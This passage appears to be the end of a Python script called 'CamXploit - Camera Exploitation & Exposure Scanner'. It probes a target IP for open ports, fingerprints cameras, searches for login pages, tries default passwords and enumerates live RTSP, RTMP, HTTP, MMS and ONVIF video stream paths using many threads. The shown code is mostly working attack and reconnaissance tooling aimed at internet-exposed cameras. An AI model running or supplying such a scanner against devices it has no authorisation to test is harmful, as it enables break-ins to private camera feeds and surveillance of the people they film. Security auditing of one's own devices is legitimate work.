                    print(f"  ✅ Streaming URL: {url}")
                    return True
                elif any(x in url.lower() for x in ['/video', '/stream', '/live', '/mjpg', '/snapshot']):
                    print(f"  ✅ Potential Stream: {url}")
                    print(f"     📺 Content-Type: {content_type}")
                    return True
        except Exception as e:
            pass
        return False
    
    # Check all ports for streams with threading
    threads = []
    max_concurrent = 30
    
    for port in open_ports:
        # Check RTSP streams
        if port in streaming_ports['rtsp']:
            for path in stream_paths['rtsp']:
                url = f"rtsp://{ip}:{port}{path}"
                thread = threading.Thread(target=lambda u=url: check_stream_with_details(u) or None)
                thread.daemon = True
                threads.append(thread)
                thread.start()
                found_streams = True
                
                if len(threads) >= max_concurrent:
                    for t in threads:
                        t.join()
                    threads = []
        
        # Check RTMP streams
        if port in streaming_ports['rtmp']:
            for path in stream_paths['rtmp']:
                url = f"rtmp://{ip}:{port}{path}"
                thread = threading.Thread(target=lambda u=url: check_stream_with_details(u) or None)
                thread.daemon = True
                threads.append(thread)
                thread.start()
                found_streams = True
                
                if len(threads) >= max_concurrent:
                    for t in threads:
                        t.join()
                    threads = []
        
        # Check HTTP/HTTPS streams
        if port in streaming_ports['http'] + streaming_ports['https']:
            protocol = 'https' if port in streaming_ports['https'] else 'http'
            for path in stream_paths['http']:
                url = f"{protocol}://{ip}:{port}{path}"
                thread = threading.Thread(target=lambda u=url: check_stream_with_details(u) or None)
                thread.daemon = True
                threads.append(thread)
                thread.start()
                found_streams = True
                
                if len(threads) >= max_concurrent:
                    for t in threads:
                        t.join()
                    threads = []
        
        # Check MMS streams
        if port in streaming_ports['mms']:
            url = f"mms://{ip}:{port}"
            thread = threading.Thread(target=lambda u=url: check_stream_with_details(u) or None)
            thread.daemon = True
            threads.append(thread)
            thread.start()
            found_streams = True
            
            if len(threads) >= max_concurrent:
                for t in threads:
                    t.join()
                threads = []
        
        # Check ONVIF streams
        if port in streaming_ports['onvif']:
            url = f"http://{ip}:{port}/onvif/device_service"
            thread = threading.Thread(target=lambda u=url: check_stream_with_details(u) or None)
            thread.daemon = True
            threads.append(thread)
            thread.start()
            found_streams = True
            
            if len(threads) >= max_concurrent:
                for t in threads:
                    t.join()
                threads = []
    
    # Wait for remaining threads
    for thread in threads:
        thread.join()
    
    if not found_streams:
        print("  ❌ No live streams detected")
    else:
        print(f"  📊 Stream detection completed")

def main():
    global threads_running
    try:
        # SECURITY FIX: Accept IP from command-line argument instead of stdin
        parser = argparse.ArgumentParser(
            description='CamXploit - Camera Exploitation & Exposure Scanner',
            formatter_class=argparse.RawDescriptionHelpFormatter
        )
        parser.add_argument('--ip', type=str, required=True, help='Target IP address to scan')
        args = parser.parse_args()
        
        target_ip = args.ip.strip()
        if not validate_ip(target_ip):
            return
        
        print(BANNER)
        print('____________________________________________________________________________\n')
        
        print_search_urls(target_ip)
        google_dork_search(target_ip)
        get_ip_location_info(target_ip)
        
        open_ports = check_ports(target_ip)
        if open_ports:
            camera_found = check_if_camera(target_ip, open_ports)
            if not camera_found:
                choice = input("\n[❓] No camera found. Do you still want to check login pages, vulnerabilities, and passwords? [y/N]: ").strip().lower()
                if choice != "y":
                    print("\n[✅] Scan Completed! No camera found.")
                    return
            check_login_pages(target_ip, open_ports)
            fingerprint_camera(target_ip, open_ports)
            test_default_passwords(target_ip, open_ports)
            detect_live_streams(target_ip, open_ports)
        else:
            print("\n[❌] No open ports found. Likely no camera here.")
        print("\n[✅] Scan Completed!")
        
    except KeyboardInterrupt:
        print("\n[!] Scan aborted by user")
        threads_running = False
        sys.exit(1)

if __name__ == "__main__":
    main()